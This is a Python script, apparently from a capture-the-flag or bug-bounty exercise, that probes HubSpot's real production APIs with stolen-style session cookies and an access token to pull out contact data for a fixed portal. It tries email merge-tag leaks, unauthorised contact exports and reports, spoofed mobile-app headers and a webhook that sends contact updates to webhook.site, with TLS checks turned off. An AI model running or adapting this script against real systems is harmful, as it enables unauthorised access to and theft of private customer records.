#!/usr/bin/env python3
"""
Data Exfiltration Vectors - Creative approaches to extract contact data
Testing: Email injection, workflows, exports, notifications, mobile APIs
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import base64
import time

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("DATA EXFILTRATION ATTACK VECTORS")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. EMAIL TEMPLATE WITH CONTACT MERGE TAGS
# ============================================================================

print("\n[1] TESTING EMAIL TEMPLATE DATA EXFILTRATION")
print("="*80)

# Try to create/view email templates that use contact merge tags
email_endpoints = [
    f'https://api.hubapi.com/marketing-emails/v1/emails?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/marketing/v3/emails?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/email/{TARGET_PORTAL}/list',
    f'https://app.hubspot.com/templates/{TARGET_PORTAL}/list',
]

for url in email_endpoints:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# Try to send a test email with contact merge tags
print("\n[*] Attempting to send test email with merge tags...")

test_email_payload = {
    'portalId': TARGET_PORTAL,
    'emailType': 'SIMPLE',
    'to': 'test@example.com',
    'from': 'noreply@hubspot.com',
    'subject': 'Test',
    'body': 'Firstname: {{ contact.firstname }}, Secret: {{ contact.super_secret }}',
}

send_email_urls = [
    'https://api.hubapi.com/email/v1/send',
    'https://api.hubapi.com/email/public/v1/singleEmail/send',
]

for url in send_email_urls:
    try:
        r = requests.post(url, json=test_email_payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        if r.status_code not in [401, 403, 404]:
            print(f"\n{url}")
            print(f"  Status: {r.status_code}")
            print(f"  Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 2. WORKFLOW / AUTOMATION TRIGGERS
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING WORKFLOW ENDPOINTS")
print("="*80)

workflow_urls = [
    f'https://api.hubapi.com/automation/v3/workflows?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/automation/v4/flows?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/workflows/{TARGET_PORTAL}/flows',
]

for url in workflow_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  GET: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 3. EXPORT / IMPORT ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[3] TESTING EXPORT/IMPORT FUNCTIONALITY")
print("="*80)

# Try to trigger a contact export
export_urls = [
    f'https://api.hubapi.com/crm/v3/exports/export/async?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/contacts/v1/export?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/export',
]

for url in export_urls:
    print(f"\n{url[:70]}...")

    # Try GET first
    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  GET: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

    # Try POST with export request
    export_payload = {
        'portalId': TARGET_PORTAL,
        'exportType': 'CONTACT',
        'exportName': 'Test Export',
        'properties': ['firstname', 'super_secret', 'email'],
        'filters': []
    }

    try:
        r = session.post(url, json=export_payload, verify=False, timeout=10)

        if r.status_code not in [401, 403, 404, 405]:
            print(f"  POST: {r.status_code}")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                # Check if export was created
                if 'id' in data or 'exportId' in data:
                    print(f"  *** EXPORT CREATED! ***")
                    findings.append({'type': 'export', 'url': url, 'data': data})
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# Check for existing exports
check_export_urls = [
    f'https://api.hubapi.com/crm/v3/exports/export/async/tasks?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/exports',
]

for url in check_export_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:500]}")

                if 'results' in data or 'exports' in data:
                    print(f"  *** EXPORTS FOUND! ***")
                    findings.append({'type': 'export_list', 'url': url, 'data': data})
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 4. MOBILE API ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[4] TESTING MOBILE API ENDPOINTS")
print("="*80)

mobile_headers = {
    'User-Agent': 'HubSpot-iOS/9.0 (iPhone; iOS 16.0; Scale/3.00)',
    'X-HubSpot-App': 'mobile-ios',
    'X-HubSpot-App-Version': '9.0',
}

mobile_endpoints = [
    f'https://api.hubapi.com/mobile/v1/contacts/{TARGET_PORTAL}/contact/1',
    f'https://api.hubapi.com/mobile/v2/contacts?portalId={TARGET_PORTAL}&vid=1',
    f'https://mobile-api.hubspot.com/contacts/{TARGET_PORTAL}/1',
    f'https://app.hubspot.com/mobile-api/contacts/{TARGET_PORTAL}/1',
]

for url in mobile_endpoints:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, headers=mobile_headers, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE VIA MOBILE API! ***")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:500]}")

                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n  *** CONTAINS CONTACT DATA! ***")
                    findings.append({'type': 'mobile_api', 'url': url, 'data': data})
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 5. NOTIFICATION / WEBHOOK CREATION
# ============================================================================

print("\n" + "="*80)
print("[5] TESTING WEBHOOK SUBSCRIPTION")
print("="*80)

# Try to create a webhook that will receive contact updates
webhook_urls = [
    f'https://api.hubapi.com/webhooks/v3/{TARGET_PORTAL}/subscriptions',
    f'https://api.hubapi.com/crm/v3/timeline/events/batch/create',
]

webhook_payload = {
    'enabled': True,
    'subscriptionDetails': {
        'subscriptionType': 'contact.propertyChange',
        'propertyName': 'firstname'
    },
    'webhookUrl': 'https://webhook.site/test'
}

for url in webhook_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.post(url, json=webhook_payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        if r.status_code not in [401, 403, 404, 405]:
            print(f"  Status: {r.status_code}")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 6. THIRD-PARTY INTEGRATION ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[6] TESTING INTEGRATION ENDPOINTS")
print("="*80)

integration_endpoints = [
    f'https://api.hubapi.com/crm-associations/v1/associations/{TARGET_PORTAL}',
    f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/integrations',
    f'https://app.hubspot.com/integrations/{TARGET_PORTAL}',
]

for url in integration_endpoints:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 7. REPORTING / ANALYTICS WITH CONTACT DATA
# ============================================================================

print("\n" + "="*80)
print("[7] TESTING REPORT GENERATION")
print("="*80)

report_urls = [
    f'https://api.hubapi.com/crm/v3/reports?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/reports/{TARGET_PORTAL}/list',
    f'https://app.hubspot.com/analytics/{TARGET_PORTAL}/reports',
]

for url in report_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# Try to create a custom report
report_payload = {
    'portalId': TARGET_PORTAL,
    'name': 'Contact Properties Report',
    'dataSource': 'CRM_OBJECT',
    'objectTypeId': '0-1',
    'properties': ['firstname', 'super_secret'],
    'filters': [{'property': 'hs_object_id', 'operator': 'EQ', 'value': '1'}]
}

create_report_urls = [
    'https://api.hubapi.com/crm/v3/reports',
    'https://api.hubapi.com/analytics/v2/reports',
]

for url in create_report_urls:
    try:
        r = session.post(url, json=report_payload, verify=False, timeout=10)

        if r.status_code not in [401, 403, 404, 405]:
            print(f"\n{url}")
            print(f"  Status: {r.status_code}")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

print("\n" + "="*80)
print("DATA EXFILTRATION VECTORS COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL DATA EXFILTRATION POINTS! ***\n")

    with open('/home/user/Hub/findings/exfiltration_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")

        if 'super_secret' in json.dumps(finding).lower():
            print(f"\n*** CTF FLAG FOUND! ***")
else:
    print("\nNo data exfiltration vectors successful.")
